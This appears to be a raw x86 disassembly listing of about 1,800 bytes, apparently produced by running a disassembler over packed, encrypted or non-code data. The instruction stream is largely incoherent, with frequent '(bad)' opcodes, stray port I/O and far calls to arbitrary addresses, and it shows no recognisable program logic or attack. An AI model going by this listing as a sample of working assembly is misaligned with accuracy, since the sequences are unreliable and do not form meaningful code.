  42bb86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bb87:	add    eax,0xd9a7f995
  42bb8c:	imul   eax,DWORD PTR [edi-0x43],0x20
  42bb90:	or     eax,0x36b024cd
  42bb95:	aas    
  42bb96:	sub    ecx,0x966f005a
  42bb9c:	ins    DWORD PTR es:[edi],dx
  42bb9d:	test   al,0xd5
  42bb9f:	jnp    0x42bb91
  42bba1:	mov    bh,0xff
  42bba3:	mov    ebp,0x9fa7e603
  42bba8:	inc    esp
  42bba9:	cmc    
  42bbaa:	xor    DWORD PTR [edx+0x6624c2e6],ebx
  42bbb0:	fiadd  WORD PTR [eax]
  42bbb2:	pop    esi
  42bbb3:	add    al,0x56
  42bbb5:	sbb    al,0x1c
  42bbb7:	sbb    al,0x9
  42bbb9:	xor    dl,bl
  42bbbb:	jne    0x42bba9
  42bbbd:	loopne 0x42bc20
  42bbbf:	xchg   BYTE PTR [eax],ah
  42bbc1:	(bad)  
  42bbc2:	fcomp  QWORD PTR [ecx+eax*1]
  42bbc5:	mov    BYTE PTR [ebx-0x2e],ch
  42bbc8:	call   0xbc39:0xd87c7f1d
  42bbcf:	lds    eax,FWORD PTR [edi+0x1963d384]
  42bbd5:	div    BYTE PTR [ecx-0x42]
  42bbd8:	cmp    edi,DWORD PTR [ebx-0x7e]
  42bbdb:	imul   ebx,edx,0x66
  42bbde:	addr16 out 0x9b,al
  42bbe1:	push   es
  42bbe2:	in     eax,dx
  42bbe3:	mov    edx,0x5abb61cd
  42bbe8:	stos   BYTE PTR es:[edi],al
  42bbe9:	cmp    ebx,esi
  42bbeb:	adc    DWORD PTR [esi+0x5b],eax
  42bbee:	xchg   ebx,eax
  42bbef:	sbb    ebx,DWORD PTR [ebx+0x5a87d3bf]
  42bbf5:	sub    al,BYTE PTR ds:0x37c15f25
  42bbfb:	fidiv  WORD PTR [edi]
  42bbfd:	mov    fs,WORD PTR [esi-0x71]
  42bc00:	sub    BYTE PTR [eax+0x946f529],0x3a
  42bc07:	enter  0x5a1e,0xf8
  42bc0b:	push   ebx
  42bc0c:	add    al,0xf
  42bc0e:	outs   dx,DWORD PTR ds:[esi]
  42bc0f:	push   cs
  42bc10:	cmp    esi,DWORD PTR [ecx+0x5d]
  42bc13:	push   ebx
  42bc14:	sbb    DWORD PTR [edi],esp
  42bc16:	retf   0x5c1e
  42bc19:	and    DWORD PTR [ebx+0x22b0edc8],esi
  42bc1f:	inc    esp
  42bc20:	dec    eax
  42bc21:	imul   ecx,DWORD PTR [edi-0x42a4f941],0x3
  42bc28:	pop    esi
  42bc29:	cmp    bh,al
  42bc2b:	data16 or BYTE PTR [ebx+eiz*1+0x4d4adcf1],0x4
  42bc34:	outs   dx,DWORD PTR ds:[esi]
  42bc35:	outs   dx,BYTE PTR ds:[esi]
  42bc36:	arpl   WORD PTR [ebx],sp
  42bc38:	push   eax
  42bc39:	mov    dh,0x61
  42bc3b:	(bad)  
  42bc3c:	in     al,0x1e
  42bc3e:	pushf  
  42bc3f:	sti    
  42bc40:	cmp    eax,0x91abadad
  42bc45:	in     al,dx
  42bc46:	xchg   ebx,eax
  42bc47:	inc    ebx
  42bc48:	pop    edi
  42bc49:	sbb    al,0xe3
  42bc4b:	pop    ss
  42bc4c:	test   al,0xaa
  42bc4e:	push   ebp
  42bc4f:	sbb    esi,edi
  42bc51:	pushf  
  42bc52:	inc    ecx
  42bc53:	fisttp DWORD PTR [ecx-0x26]
  42bc56:	pop    esp
  42bc57:	xlat   BYTE PTR ds:[ebx]
  42bc58:	inc    ebx
  42bc59:	iret   
  42bc5a:	mov    ebp,0xa0d74308
  42bc5f:	in     al,dx
  42bc60:	xor    esp,eax
  42bc62:	cld    
  42bc63:	or     cl,dh
  42bc65:	mov    bh,0xcd
  42bc67:	xor    al,0x39
  42bc69:	mov    ebx,0x74dd7268
  42bc6e:	cmp    DWORD PTR [edi+0x2b6d09a6],0x520f292
  42bc78:	sar    BYTE PTR ds:0xab37c45a,cl
  42bc7e:	retf   
  42bc7f:	imul   esi,DWORD PTR [ecx-0x29],0xffffff86
  42bc83:	push   ss
  42bc84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bc85:	stos   DWORD PTR es:[edi],eax
  42bc86:	push   ebp
  42bc87:	pop    esp
  42bc88:	xlat   BYTE PTR ds:[ebx]
  42bc89:	call   0x3bdbed51
  42bc8e:	jecxz  0x42bca3
  42bc90:	jecxz  0x42bcca
  42bc92:	lahf   
  42bc93:	xchg   ecx,eax
  42bc94:	or     edx,edi
  42bc96:	call   0x440:0xde13ca40
  42bc9d:	pandn  mm0,QWORD PTR [ebx+0x26]
  42bca1:	inc    eax
  42bca2:	xchg   edx,eax
  42bca3:	xor    al,0x69
  42bca5:	mov    ds:0x85264782,al
  42bcaa:	xor    edx,eax
  42bcac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bcad:	adc    ch,BYTE PTR [eax+0x6075135e]
  42bcb3:	outs   dx,DWORD PTR ds:[esi]
  42bcb4:	scas   eax,DWORD PTR es:[edi]
  42bcb5:	ud0    edi,edx
  42bcb8:	cld    
  42bcb9:	sub    al,0xbe
  42bcbb:	xor    al,0x35
  42bcbd:	stos   DWORD PTR es:[edi],eax
  42bcbe:	les    ecx,FWORD PTR ds:[ebx+edi*2+0x4]
  42bcc3:	scas   eax,DWORD PTR es:[edi]
  42bcc4:	pop    ds
  42bcc5:	pop    edi
  42bcc6:	pop    eax
  42bcc7:	mov    eax,ds:0x18a6e6c4
  42bccc:	pushf  
  42bccd:	or     bl,al
  42bccf:	and    cl,BYTE PTR ds:[esi+0x17a17804]
  42bcd6:	or     DWORD PTR [ecx],ebx
  42bcd8:	test   DWORD PTR [ecx],esp
  42bcda:	inc    ebx
  42bcdb:	jle    0x42bc6b
  42bcdd:	mov    BYTE PTR [eax-0x7c],dh
  42bce0:	adc    BYTE PTR [ebx],0xe6
  42bce3:	fcomp  st(7)
  42bce5:	rcr    esi,0x7f
  42bce8:	out    0xcc,al
  42bcea:	call   0xf7e67159
  42bcef:	inc    ebx
  42bcf0:	stos   DWORD PTR es:[edi],eax
  42bcf1:	pusha  
  42bcf2:	lahf   
  42bcf3:	pop    edi
  42bcf4:	ret    0x13f1
  42bcf7:	xor    dh,BYTE PTR [esi]
  42bcf9:	out    dx,eax
  42bcfa:	and    ebx,DWORD PTR [ebx]
  42bcfc:	(bad)  
  42bcfd:	pop    eax
  42bcfe:	push   ss
  42bcff:	xor    eax,0x4c6f8652
  42bd04:	xchg   esp,eax
  42bd05:	ror    BYTE PTR [ecx+0x8],1
  42bd08:	shr    ah,0x54
  42bd0b:	lock sub al,0x8d
  42bd0e:	inc    ebx
  42bd0f:	hlt    
  42bd10:	inc    esp
  42bd11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bd12:	mov    eax,ds:0xc4efed90
  42bd17:	cdq    
  42bd18:	je     0x42bd6f
  42bd1a:	inc    ebp
  42bd1b:	rcr    BYTE PTR [edi],1
  42bd1d:	pop    esp
  42bd1e:	gs (bad) 
  42bd20:	stos   DWORD PTR es:[edi],eax
  42bd21:	jno    0x42bd68
  42bd23:	ins    DWORD PTR es:[edi],dx
  42bd24:	push   ss
  42bd25:	xor    cl,BYTE PTR [ecx-0x6d]
  42bd28:	mov    esp,0x3f456237
  42bd2d:	fscale 
  42bd2f:	into   
  42bd30:	push   0x19
  42bd32:	aaa    
  42bd33:	mov    ch,0x5b
  42bd35:	lock fsub DWORD PTR [ebp+0x37aeee0a]
  42bd3c:	mov    ds:0x1c11adeb,eax
  42bd41:	js     0x42bda0
  42bd43:	(bad)  
  42bd44:	(bad)  
  42bd45:	iret   
  42bd46:	outs   dx,BYTE PTR ds:[esi]
  42bd47:	inc    ecx
  42bd48:	push   ebx
  42bd49:	outs   dx,DWORD PTR ds:[esi]
  42bd4a:	sub    ecx,DWORD PTR [edi+eiz*4-0x5]
  42bd4e:	icebp  
  42bd4f:	mov    DWORD PTR [edi],0x3fb5579f
  42bd55:	aaa    
  42bd56:	mov    ecx,esp
  42bd58:	idiv   BYTE PTR [ecx-0x64]
  42bd5b:	xchg   esp,eax
  42bd5c:	xchg   edi,eax
  42bd5d:	xchg   BYTE PTR [esi],bl
  42bd5f:	in     eax,0x50
  42bd61:	shl    edi,cl
  42bd63:	cmp    eax,0xfcc0099a
  42bd68:	addr16 or al,0x7f
  42bd6b:	mov    eax,0x998d1b4
  42bd70:	sub    BYTE PTR [edx],cl
  42bd72:	or     esi,0x19d04475
  42bd78:	jae    0x42bd1d
  42bd7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bd7b:	ret    
  42bd7c:	mov    ebp,DWORD PTR [edx-0x75]
  42bd7f:	pop    ds
  42bd80:	xlat   BYTE PTR ds:[ebx]
  42bd81:	ins    DWORD PTR es:[edi],dx
  42bd82:	xor    BYTE PTR [ecx+0x303383f4],ah
  42bd88:	lods   eax,DWORD PTR ds:[esi]
  42bd89:	xor    eax,0x80d4b061
  42bd8e:	mov    eax,DWORD PTR [ebx]
  42bd90:	jns    0x42bd5e
  42bd92:	out    0xab,eax
  42bd94:	push   0xeac541a5
  42bd99:	enter  0xb386,0x5
  42bd9d:	call   0xdaaf13c8
  42bda2:	sbb    eax,DWORD PTR [edx+0x68]
  42bda5:	mov    bl,0x5
  42bda7:	mov    dl,0x2f
  42bda9:	or     cl,0x9f
  42bdac:	cmc    
  42bdad:	jecxz  0x42bda1
  42bdaf:	dec    eax
  42bdb0:	adc    eax,0x638f9fcf
  42bdb5:	jnp    0x42bd8b
  42bdb7:	mov    esi,DWORD PTR [esi]
  42bdb9:	fcmovu st,st(4)
  42bdbb:	and    edx,edx
  42bdbd:	xor    BYTE PTR [ebp+0x4fa634c4],0x8d
  42bdc4:	loopne 0x42bda7
  42bdc6:	add    eax,0xc12b637
  42bdcb:	scas   al,BYTE PTR es:[edi]
  42bdcc:	pop    ebx
  42bdcd:	adc    eax,0x7bbe47c2
  42bdd2:	adc    ebp,DWORD PTR [edi+edx*1+0xe]
  42bdd6:	adc    BYTE PTR [esi],al
  42bdd8:	sbb    al,BYTE PTR [ecx+0x75]
  42bddb:	dec    ebp
  42bddc:	adc    eax,0x9c004897
  42bde1:	(bad)  
  42bde2:	xor    al,BYTE PTR [edx]
  42bde4:	cwde   
  42bde5:	xor    BYTE PTR [eax+edx*4],cl
  42bde8:	mov    ebx,0x1fc67304
  42bded:	cmp    ebp,DWORD PTR [esi+0x7e33ed64]
  42bdf3:	call   0xa871fbee
  42bdf8:	or     DWORD PTR [edx-0x6d],edi
  42bdfb:	inc    edi
  42bdfc:	dec    esi
  42bdfd:	xchg   edx,eax
  42bdfe:	loope  0x42be6c
  42be00:	cmp    esi,edx
  42be02:	or     bl,BYTE PTR [esp-0x3d]
  42be06:	sbb    eax,ebp
  42be08:	or     eax,0xdb110bbd
  42be0d:	jle    0x42be5b
  42be0f:	xor    esi,eax
  42be11:	lods   al,BYTE PTR ds:[esi]
  42be12:	mov    al,0x65
  42be14:	add    BYTE PTR [eax-0x1a6b2b29],0x98
  42be1b:	stc    
  42be1c:	out    dx,al
  42be1d:	push   esi
  42be1e:	lods   al,BYTE PTR ds:[esi]
  42be1f:	mov    ebx,0xef750ebf
  42be24:	jl     0x42be4d
  42be26:	stos   BYTE PTR es:[edi],al
  42be27:	mov    bl,0xaf
  42be29:	and    bh,dh
  42be2b:	int3   
  42be2c:	adc    al,0xbe
  42be2e:	icebp  
  42be2f:	repz pop ecx
  42be31:	(bad)  
  42be32:	int3   
  42be33:	inc    ebp
  42be34:	int3   
  42be35:	xchg   ebp,eax
  42be36:	imul   esp,DWORD PTR [edi+ebp*8-0x6e],0xffffffe6
  42be3b:	daa    
  42be3c:	sub    eax,0x1e0aa850
  42be41:	add    BYTE PTR [edx-0x18],bl
  42be44:	js     0x42be50
  42be46:	jb     0x42bdfc
  42be48:	mov    esp,ebp
  42be4a:	fstp   QWORD PTR [edx]
  42be4c:	inc    esi
  42be4d:	sar    WORD PTR [eax+0x3f866835],cl
  42be54:	push   0x41
  42be56:	add    ebx,ebp
  42be58:	ins    BYTE PTR es:[edi],dx
  42be59:	repnz push eax
  42be5b:	or     ah,BYTE PTR [ebx]
  42be5d:	shl    DWORD PTR [ebp+0x48],cl
  42be60:	fptan  
  42be62:	dec    edx
  42be63:	mov    DWORD PTR [ebx],ebp
  42be65:	(bad)  
  42be66:	jge    0x42be39
  42be68:	and    ah,cl
  42be6a:	sub    dl,al
  42be6c:	cmp    eax,eax
  42be6e:	xor    BYTE PTR [ecx+0x2a],ah
  42be71:	jae    0x42be4a
  42be73:	and    eax,0x8f64e7b5
  42be78:	jg     0x42be4f
  42be7a:	xor    BYTE PTR [esi-0x52],ch
  42be7d:	add    eax,0xd99b6bc9
  42be82:	lods   al,BYTE PTR ds:[esi]
  42be83:	fld    QWORD PTR [ebx-0x72f1fab3]
  42be89:	mov    ecx,0xc11503b5
  42be8e:	aad    0x49
  42be90:	xor    DWORD PTR [edi+ebx*1],edi
  42be93:	int3   
  42be94:	mov    eax,0x5ee20424
  42be99:	mov    edx,0x10692928
  42be9e:	mov    al,0xc1
  42bea0:	ds cli 
  42bea2:	mov    al,ds:0xc38364c7
  42bea7:	arpl   dx,ax
  42bea9:	in     eax,dx
  42beaa:	adc    eax,DWORD PTR [ebp+0x7c]
  42bead:	(bad)  
  42beae:	(bad)  
  42beaf:	(bad)  
  42beb1:	adc    edx,eax
  42beb3:	xor    eax,0x932e3701
  42beb8:	push   ss
  42beb9:	in     al,dx
  42beba:	push   cs
  42bebb:	cmp    BYTE PTR [ecx+0x61],dh
  42bebe:	ins    BYTE PTR es:[edi],dx
  42bebf:	push   edx
  42bec0:	sbb    eax,0x26ab6884
  42bec5:	inc    edx
  42bec6:	pop    esi
  42bec7:	ror    DWORD PTR [eax+0x3d],1
  42beca:	(bad)  
  42becb:	enter  0xd865,0x1a
  42becf:	mov    ebp,0x470b0f64
  42bed4:	pop    edx
  42bed5:	dec    ebp
  42bed6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bed7:	push   ebx
  42bed8:	pop    ss
  42bed9:	and    eax,0x64c91bd3
  42bede:	mov    esp,0xa7a12898
  42bee3:	fimul  WORD PTR [ecx-0x13fe422b]
  42bee9:	cld    
  42beea:	int    0x19
  42beec:	cmc    
  42beed:	popa   
  42beee:	mov    ?,WORD PTR [ebx+0x19816a02]
  42bef4:	jae    0x42bf3c
  42bef6:	les    esp,FWORD PTR [ecx+0x4319c7d3]
  42befc:	pushf  
  42befd:	dec    ecx
  42befe:	in     eax,dx
  42beff:	mov    ecx,0xb9c16d8d
  42bf04:	das    
  42bf05:	and    BYTE PTR [edi+0x44],ah
  42bf08:	jb     0x42beec
  42bf0a:	(bad)  
  42bf0c:	jae    0x42bece
  42bf0e:	push   ecx
  42bf0f:	adc    dh,dh
  42bf11:	add    esi,DWORD PTR [ecx-0x7812b361]
  42bf17:	dec    eax
  42bf18:	outs   dx,DWORD PTR ds:[esi]
  42bf19:	imul   ch
  42bf1b:	mov    DWORD PTR [eax+0x587aa6e1],esp
  42bf21:	cs (bad) 
  42bf23:	and    DWORD PTR [ebp+0x71],edi
  42bf26:	sbb    eax,DWORD PTR [esi]
  42bf28:	push   ds
  42bf29:	push   ds
  42bf2a:	ret    0x3e9
  42bf2d:	rcr    DWORD PTR [eax-0x29],cl
  42bf30:	(bad)
  42bf34:	xchg   ebp,eax
  42bf35:	int3   
  42bf36:	cmp    ecx,DWORD PTR [ebx]
  42bf38:	mov    fs,WORD PTR [edx+ecx*8]
  42bf3b:	fmul   DWORD PTR [esi+0x6b]
  42bf3e:	mov    ebx,0xd1466421
  42bf43:	shr    WORD PTR [edx+esi*4-0x7e],0x8b
  42bf49:	or     edx,DWORD PTR ds:0xe324c58
  42bf4f:	xchg   ecx,eax
  42bf50:	nop
  42bf51:	adc    ecx,DWORD PTR [esi+0x7f1a46b9]
  42bf57:	test   DWORD PTR [ecx+edi*8-0x2e67896],esi
  42bf5e:	test   BYTE PTR [edx+eax*8+0x5fdc1264],al
  42bf65:	dec    edi
  42bf66:	es inc edx
  42bf68:	pop    edx
  42bf69:	(bad)  
  42bf6a:	mov    dh,0x90
  42bf6c:	adc    eax,0x9187b79d
  42bf71:	push   0x557d83aa
  42bf76:	cmp    eax,0x143ebdea
  42bf7b:	mov    esi,0xfe2f1c76
  42bf80:	outs   dx,BYTE PTR ds:[esi]
  42bf81:	jo     0x42bfa8
  42bf83:	cli    
  42bf84:	xor    DWORD PTR [esi],ecx
  42bf86:	popf   
  42bf87:	or     BYTE PTR [ecx+eax*1],dh
  42bf8a:	popf   
  42bf8b:	cmp    bl,BYTE PTR [edi+0x15540ab]
  42bf91:	push   eax
  42bf92:	scas   eax,DWORD PTR es:[edi]
  42bf93:	adc    eax,0xb0c9903
  42bf98:	leave  
  42bf99:	push   ds
  42bf9a:	outs   dx,DWORD PTR ds:[esi]
  42bf9b:	xchg   esi,eax
  42bf9c:	ins    BYTE PTR es:[edi],dx
  42bf9d:	ret    0x6ffe
  42bfa0:	aam    0x4
  42bfa2:	adc    ah,0xe3
  42bfa5:	(bad)  
  42bfa6:	(bad)  
  42bfa7:	ror    BYTE PTR [ebx+0x220f26e6],0xf7
  42bfae:	xor    al,0x63
  42bfb0:	int    0x9e
  42bfb2:	cmp    bh,BYTE PTR [eax]
  42bfb4:	mov    edi,0xa36a14f8
  42bfb9:	adc    eax,0x6244dcbc
  42bfbe:	and    BYTE PTR [esp+edi*8],0x99
  42bfc2:	leave  
  42bfc3:	and    ch,BYTE PTR [esi-0x12]
  42bfc6:	jbe    0x42c009
  42bfc8:	xor    edi,esp
  42bfca:	push   eax
  42bfcb:	push   esi
  42bfcd:	outs   dx,BYTE PTR ds:[esi]
  42bfce:	sar    BYTE PTR [esi+0x66],cl
  42bfd1:	clc    
  42bfd2:	(bad)  
  42bfd3:	js     0x42bfb5
  42bfd5:	cli    
  42bfd6:	into   
  42bfd7:	pop    ds
  42bfd8:	nop
  42bfd9:	cmp    eax,0x1dd1c2e3
  42bfde:	int    0x4
  42bfe0:	shr    DWORD PTR [eax-0x3e],1
  42bfe3:	pop    esp
  42bfe4:	push   esi
  42bfe5:	je     0x42bf9e
  42bfe7:	fist   DWORD PTR [eax+0x25]
  42bfea:	sub    DWORD PTR [eax],ebp
  42bfec:	push   0xccaf668c
  42bff1:	bound  edi,QWORD PTR [ebp+0x6c]
  42bff4:	adc    bl,bh
  42bff6:	cmp    dl,BYTE PTR [ebx]
  42bff8:	rol    DWORD PTR [esi-0x2602f878],0x1a
  42bfff:	mov    esi,0xf826cdf2
  42c004:	fisttp DWORD PTR [eax-0x39]
  42c007:	jge    0x42bfc8
  42c009:	mov    edx,ss
  42c00b:	outs   dx,DWORD PTR ds:[esi]
  42c00c:	inc    esi
  42c00d:	jo     0x42c07d
  42c00f:	dec    edx
  42c010:	outs   dx,DWORD PTR ds:[esi]
  42c011:	jbe    0x42c073
  42c013:	sub    al,0x7c
  42c015:	loope  0x42c02d
  42c017:	shr    DWORD PTR [edi+esi*8+0x72],1
  42c01b:	ins    DWORD PTR es:[edi],dx
  42c01c:	cmp    dh,BYTE PTR [edi+0x3578e686]
  42c022:	out    0xba,eax
  42c024:	repz js 0x42bfc0
  42c027:	jmp    FWORD PTR [esi-0x7d5762fa]
  42c02d:	sti    
  42c02e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c02f:	fnstenv [ecx+ecx*2+0x339e87aa]
  42c036:	mov    al,0xa0
  42c038:	jge    0x42c018
  42c03a:	cwde   
  42c03b:	sub    esi,ecx
  42c03d:	out    0xa1,eax
  42c03f:	and    BYTE PTR [esi+0x3bce709],ch
  42c045:	dec    ebx
  42c046:	jae    0x42c058
  42c048:	mov    eax,ds:0x6787ad0f
  42c04d:	sti    
  42c04e:	push   esi
  42c04f:	fmul   DWORD PTR [edx-0x69]
  42c052:	push   eax
  42c053:	sbb    al,0x4e
  42c055:	arpl   ax,bp
  42c057:	pusha  
  42c058:	sbb    al,0x27
  42c05a:	(bad)  
  42c05b:	push   ebx
  42c05c:	jo     0x42c0b8
  42c05e:	adc    al,0xb2
  42c060:	jno    0x42c087
  42c062:	fmul   st,st(0)
  42c064:	inc    esi
  42c065:	in     al,dx
  42c066:	sbb    ebp,DWORD PTR es:[edi+0x41]
  42c06a:	and    DWORD PTR [esp+edx*4-0xf],esi
  42c06e:	popa   
  42c06f:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  42c071:	test   BYTE PTR [ecx],ch
  42c073:	cmp    ch,ah
  42c075:	xlat   BYTE PTR ds:[ebx]
  42c076:	xor    al,0x6
  42c078:	mov    cl,0x90
  42c07a:	leave  
  42c07b:	mov    ds:0xf233e85,al
  42c080:	xchg   cx,ax
  42c082:	dec    ebx
  42c083:	adc    eax,0xccbb3c57
  42c088:	js     0x42c0c5
  42c08a:	mov    ebp,DWORD PTR [ebx-0x129a0047]
  42c090:	outs   dx,DWORD PTR ds:[esi]
  42c091:	ins    BYTE PTR es:[edi],dx
  42c092:	mov    edx,0x77d3a0f8
  42c097:	jno    0x42c0ef
  42c099:	and    bh,al
  42c09b:	repz popf 
  42c09d:	fisub  DWORD PTR [edi+0x39]
  42c0a0:	fisttp DWORD PTR [ebp-0x68f1e433]
  42c0a6:	push   es
  42c0a7:	mov    ch,0xb9
  42c0a9:	out    0x14,al
  42c0ab:	pusha  
  42c0ac:	into   
  42c0ad:	lods   eax,DWORD PTR ds:[esi]
  42c0ae:	nop
  42c0af:	mov    ch,0xc3
  42c0b1:	shr    edi,0x89
  42c0b4:	fbld   TBYTE PTR [ebx-0x30]
  42c0b7:	mov    DWORD PTR [edi-0x25],edx
  42c0ba:	mov    ah,0x3
  42c0bc:	and    edx,ecx
  42c0be:	mov    esi,0x682e8b37
  42c0c3:	mov    ah,0xeb
  42c0c5:	fiadd  WORD PTR [edi-0x59]
  42c0c8:	gs jb  0x42c094
  42c0cb:	or     al,0xb
  42c0cd:	fucom  st(0)
  42c0cf:	add    eax,DWORD PTR [edx+ebp*2-0x3af68e4e]
  42c0d6:	jne    0x42c075
  42c0d8:	cmp    BYTE PTR [edi-0x5f4e9ed2],dl
  42c0de:	rcl    BYTE PTR [edx-0x4f305475],0x50
  42c0e5:	pop    ecx
  42c0e6:	out    dx,al
  42c0e7:	jns    0x42c0e4
  42c0e9:	ret    
  42c0ea:	xchg   esi,edx
  42c0ec:	loop   0x42c0bf
  42c0ee:	aaa    
  42c0ef:	loop   0x42c129
  42c0f1:	dec    esp
  42c0f2:	mov    al,0x79
  42c0f4:	outs   dx,DWORD PTR ds:[esi]
  42c0f5:	or     DWORD PTR [ebx+0x6d],0x1f
  42c0f9:	ss inc esi
  42c0fb:	dec    eax
  42c0fc:	imul   eax,DWORD PTR [edi-0x4d],0xe32f3e97
  42c103:	xchg   BYTE PTR [eax-0x4b78b5b4],cl
  42c109:	frstor [edx]
  42c10b:	imul   edx,ebp,0x75de2766
  42c111:	fs dec eax
  42c113:	jge    0x42c0c5
  42c115:	jecxz  0x42c16d
  42c117:	pop    ss
  42c118:	ficomp WORD PTR [ebp+ecx*8-0x53a07d55]
  42c11f:	mov    ebp,0xd02386d0
  42c124:	push   ebx
  42c125:	popf   
  42c126:	mov    ecx,0xab8bcc78
  42c12b:	sub    ebx,DWORD PTR [ecx+ebx*8]
  42c12e:	sub    al,0xf0
  42c130:	imul   ebp,DWORD PTR [ebx-0x46],0x64
  42c134:	cwde   
  42c135:	adc    esp,DWORD PTR [ebx+0x35d8d973]
  42c13b:	retf   
  42c13c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c13d:	sbb    eax,0x1298667e
  42c142:	ins    DWORD PTR es:[edi],dx
  42c143:	sar    BYTE PTR [edx-0x22],1
  42c146:	fiadd  WORD PTR [esi-0x422872d8]
  42c14c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c14d:	add    BYTE PTR [ebp-0x11],ah
  42c150:	int    0x78
  42c152:	icebp  
  42c153:	xor    esp,edi
  42c155:	popa   
  42c156:	call   0x4a9:0x2a4b839c
  42c15d:	sahf   
  42c15e:	popf   
  42c15f:	xor    DWORD PTR [ebx],ebp
  42c161:	dec    esi
  42c162:	seta   BYTE PTR [eax]
  42c165:	hlt    
  42c166:	mov    ebp,DWORD PTR [eax-0x73b0fa7a]
  42c16c:	xchg   ebp,eax
  42c16d:	dec    eax
  42c16e:	ret    
  42c16f:	xlat   BYTE PTR ds:[ebx]
  42c170:	loopne 0x42c115
  42c172:	fwait
  42c173:	lods   eax,DWORD PTR ds:[esi]
  42c174:	mov    eax,ds:0xc24c39b9
  42c179:	mov    al,ds:0x234161c1
  42c17e:	cmp    eax,0x1093d50
  42c183:	inc    ecx
  42c184:	dec    esi
  42c185:	xchg   ebx,eax
  42c186:	mov    eax,ds:0xc6475ca7
  42c18b:	mov    edx,0xa1a41562
  42c190:	gs cld 
  42c192:	sti    
  42c193:	lods   eax,DWORD PTR ds:[esi]
  42c194:	outs   dx,BYTE PTR ds:[esi]
  42c195:	adc    cl,BYTE PTR [edx]
  42c197:	dec    esi
  42c198:	test   BYTE PTR [esi+0x6b],ch
  42c19b:	inc    ebx
  42c19c:	push   0x3ded337b
  42c1a1:	pop    ss
  42c1a2:	dec    edx
  42c1a3:	pop    edi
  42c1a4:	cmp    eax,0x30fea780
  42c1a9:	lods   eax,DWORD PTR ds:[esi]
  42c1aa:	push   ds
  42c1ab:	jl     0x42c13b
  42c1ad:	xchg   edx,eax
  42c1ae:	jno    0x42c206
  42c1b0:	sub    BYTE PTR [edi+0x72458d85],al
  42c1b6:	stos   BYTE PTR es:[edi],al
  42c1b7:	jns    0x42c1d4
  42c1b9:	aad    0x1a
  42c1bb:	xor    DWORD PTR [eax+0x5c],0xffffff90
  42c1bf:	in     eax,dx
  42c1c0:	inc    ebp
  42c1c1:	scas   eax,DWORD PTR es:[edi]
  42c1c2:	es rol ebp,0x86
  42c1c6:	outs   dx,BYTE PTR ds:[esi]
  42c1c7:	xlat   BYTE PTR ds:[ebx]
  42c1c8:	ss mov ah,0xe0
  42c1cb:	add    dh,al
  42c1cd:	inc    ebp
  42c1ce:	int    0x98
  42c1d0:	ins    BYTE PTR es:[edi],dx
  42c1d1:	imul   eax,DWORD PTR [ebx+ebx*2-0x79],0xf
  42c1d6:	stc    
  42c1d7:	or     eax,0x9efcdc41
  42c1dc:	cs dec eax
  42c1de:	sar    DWORD PTR [ecx+0x58],cl
  42c1e1:	(bad)  
  42c1e3:	and    al,0x96
  42c1e5:	outs   dx,BYTE PTR ds:[esi]
  42c1e6:	stos   BYTE PTR es:[edi],al
  42c1e7:	ret    
  42c1e8:	push   0x54d2803e
  42c1ed:	add    eax,0xe0580a1
  42c1f2:	repz and BYTE PTR [edx-0x2d3913f1],al
  42c1f9:	inc    ebp
  42c1fa:	sbb    ecx,ebp
  42c1fc:	dec    esp
  42c1fd:	add    DWORD PTR [ecx+0x7f321aae],esi
  42c203:	sbb    al,BYTE PTR [edi+0x458ed6d4]
  42c209:	lds    ecx,FWORD PTR [ecx]
  42c20b:	sbb    ebx,ecx
  42c20d:	sbb    cl,0x52
  42c210:	or     DWORD PTR [ecx+0x348d1945],ebp
  42c216:	(bad)  
  42c218:	int3   
  42c219:	and    BYTE PTR [esi],al
  42c21b:	pop    edi
  42c21c:	dec    esp
  42c21d:	jecxz  0x42c231
  42c21f:	sar    DWORD PTR [edx-0x63b97946],0x9d
  42c226:	das    
  42c227:	loopne 0x42c1f4
  42c229:	pop    ds
  42c22a:	ins    BYTE PTR es:[edi],dx
  42c22b:	inc    esi
  42c22c:	jecxz  0x42c1b5
  42c22e:	inc    ebp
  42c22f:	div    DWORD PTR [ebx-0x2e]
  42c232:	mov    edi,?
  42c234:	cmp    eax,0x542fe386
  42c239:	aad    0xcd
  42c23b:	daa    
  42c23c:	or     bh,BYTE PTR ds:0xaf3801d8
  42c242:	std    
  42c243:	into   
  42c244:	sub    al,0x27
  42c246:	pushf  
  42c247:	mov    ah,0xc1
  42c249:	or     DWORD PTR [edi],ebp
  42c24b:	pop    esp
  42c24c:	ror    ebp,cl
  42c24e:	sahf   
  42c24f:	outs   dx,BYTE PTR ds:[esi]
  42c250:	(bad)  
  42c251:	mov    dh,0xe9
  42c253:	cmp    DWORD PTR ds:0x80bd0ad2,ebx
  42c259:	test   ebp,ecx
  42c25b:	xchg   DWORD PTR [esi+esi*4-0x3e25d407],esi
  42c262:	popw   ds
  42c264:	add    esi,DWORD PTR [edi+0x38ae66d2]
  42c26a:	push   cs
  42c26b:	pop    es
  42c26c:	aad    0x69
  42c26e:	out    dx,eax
  42c26f:	mov    cl,0xf3
  42c271:	xor    al,0x8
  42c273:	popf   
  42c274:	and    DWORD PTR [esi+0x77674d1d],eax
  42c27a:	lods   al,BYTE PTR ds:[esi]
  42c27b:	(bad)  
  42c27c:	lods   eax,DWORD PTR ds:[esi]
  42c27d:	lahf   
  42c27e:	mov    esp,0x35d5910b
  42c283:	enter  0x7189,0x8c
  42c287:	jl     0x42c270
  42c289:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c28a:	call   0x7863:0xb4175ade
  42c291:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c292:	test   BYTE PTR [eax+0x768b8cad],bl
  42c298:	ficom  DWORD PTR [edx-0x75]
  42c29b:	imul   ebx,esp,0x24c266d6
  42c2a1:	or     esp,edx
  42c2a3:	popf   
  42c2a4:	icebp  
  42c2a5:	inc    ebp
  42c2a6:	mov    eax,0xfbb0201e
  42c2ab:	scas   eax,DWORD PTR es:[edi]
